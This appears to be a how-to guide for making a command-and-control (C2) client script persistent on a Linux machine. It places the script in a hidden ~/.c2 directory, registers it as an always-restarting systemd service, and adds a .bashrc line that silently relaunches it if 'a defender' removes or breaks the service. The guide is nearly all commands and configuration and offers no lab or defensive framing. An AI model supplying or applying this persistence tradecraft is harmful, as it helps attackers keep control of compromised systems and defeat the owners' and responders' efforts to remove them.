##  Part 1: Setup the systemd Service

### 🔧 Step-by-Step:

**1. 📁 Move `c2_client.py` to a permanent path:**
Put your script somewhere stable, like:

```bash
/home/kali/.c2/c2_client.py
```

**2. 🔐 Make it executable:**

```bash
chmod +x /home/kali/.c2/c2_client.py
```

**3. 📝 Create a systemd service file:**

```bash
sudo nano /etc/systemd/system/c2client.service
```

**4. ✍️ Add the following content:**

```ini
[Unit]
Description=Kali's C2 Client
After=network.target

[Service]
ExecStart=/usr/bin/python3 /home/kali/.c2/c2_client.py
Restart=always
RestartSec=10
User=kali

[Install]
WantedBy=multi-user.target
```

> 🔐 Replace `kali` with your actual Linux username if it’s different.

**5. 💾 Save & Enable the service:**

```bash
sudo systemctl daemon-reexec
sudo systemctl daemon-reload
sudo systemctl enable c2client
```

**6. ▶️ Start the service:**

```bash
sudo systemctl start c2client
```

**🔍 Test It:**

```bash
sudo systemctl status c2client
```

Look for:

```bash
Active: active (running)
```

Reboot your machine and it should **auto-start**!

---

##  Part 2: Add `.bashrc` Fallback

This acts as a backup in case:

* `systemd` is removed, broken, or interfered with by a defender.

**✍️ Add this to the end of your `~/.bashrc` file:**

```bash
pgrep -f c2_client.py > /dev/null || python3 /home/kali/.c2/c2_client.py &
```

### ✅ What it does:

* Silently checks if `c2_client.py` is running
* If not, starts it in the background when the user logs in
